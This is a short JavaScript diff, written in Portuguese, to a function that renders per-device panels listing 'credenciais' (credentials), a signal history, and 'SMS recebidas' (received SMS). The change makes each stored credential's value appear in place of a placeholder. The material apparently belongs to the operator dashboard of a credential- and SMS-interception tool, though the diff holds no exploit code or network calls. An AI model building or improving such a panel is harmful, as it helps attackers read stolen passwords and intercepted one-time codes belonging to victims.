@@ -1554,7 +1554,7 @@ function renderLista(dispositivos, credenciais) {
       <div class="device-sinais-container" data-device-id="${idAttr}">${renderHistoricoSinaisDevice(dev.device_id)}</div>
       <div class="timeline-title">📋 Histórico de actividade</div>
       <div class="timeline">${devCreds.length===0?'<div class="empty">Sem registos</div>':devCreds.map(c=>`
-        <div class="tl-item"><div class="tl-dot ${getTipoDot(c.tipo)}"></div><div class="tl-time">—</div><div class="tl-content"><div class="tipo">${getTipoLabel(c.tipo)}</div><div>${"—"}</div></div>
+        <div class="tl-item"><div class="tl-dot ${getTipoDot(c.tipo)}"></div><div class="tl-time">—</div><div class="tl-content"><div class="tipo">${getTipoLabel(c.tipo)}</div><div>${escapeHtml(c.valor || "—")}</div></div>
       `).join("")}</div>
       <div class="timeline-title" onclick="toggleSMS(${idArg})">💬 SMS recebidas (${todasSMS.filter(s=>s.device_id===dev.device_id).length}) <span id="sms-chevron-${idAttr}">▶</span></div>
       <div class="timeline" id="sms-${idAttr}" style="display:none">
